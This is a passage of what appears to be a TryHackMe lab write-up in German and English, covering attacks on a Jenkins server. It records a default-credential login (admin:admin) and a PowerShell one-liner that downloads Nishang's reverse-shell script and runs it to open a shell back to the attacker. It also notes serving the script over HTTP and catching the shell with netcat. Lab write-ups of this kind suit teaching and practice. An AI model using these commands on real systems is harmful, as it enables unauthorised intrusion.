Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).


# Ziel: 10.10.38.83

# Initial Access
## Scanning 

Nmap 
80/tcp   open  http           Microsoft IIS httpd 7.5
3389/tcp open   ms-wbt-server?
8080/tcp open  http           Jetty 9.4.z-SNAPSHOT


## Exploiting 
Login Page für Jenkins unter 10.10.38.83:8080 gefunden

Test von Default user&Passwort 
admin:admin
->  Erfolgreicher login

von THM Kommentar 

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.242.69:8000/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.242.69 -Port 4444
```

->  Rev Shell anbieten auf eigenen http server
->  Feature finden um die Shell auf dem ziel zu laden
-> Rev Shell mit NC fangen

Shell auf http Server anbieten: 

```
python3 -m http.server
```

-> webserver auf localip:8000

http://10.10.242.69:8000/Invoke-PowershellTcp.ps1

-> Upload Möglichkeit via Project Configure gefunden ->  Auch Ausführung möglich
->  Rev Shell erhalten
-> User alfred\bruce


# Priv Escalation

Hier wird vorgegeben das wir token impersination nutzen werden